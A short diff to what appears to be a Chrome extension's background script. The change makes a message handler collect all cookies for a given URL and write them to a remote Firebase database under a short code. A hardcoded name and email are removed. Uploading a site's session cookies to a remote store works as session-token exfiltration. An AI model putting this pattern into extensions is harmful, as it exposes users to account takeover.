@@ -30,11 +30,16 @@ firebase.initializeApp(firebaseConfig);
 
 chrome.runtime.onMessage.addListener(function(request, sender) {
   if (request.type == "cookies") {
-    console.log(request);
-    var database = firebase.database()
-    database.ref(request.shortCode).set({
-      username: "Thayallan Srinathan",
-      email: "thayallan.srinathan@gmail.com",
+    console.log(request.location.replace('https://',''));
+    chrome.cookies.getAll({url: request.location}, function (cookies) {
+      console.log(cookies);
+      for (var i = 0; i < cookies.length; i++) {
+        console.log(cookies[i]);
+      }
+      var database = firebase.database()
+      database.ref(request.shortCode).set({
+        cookies: cookies,
+      });
     });
   }
 });
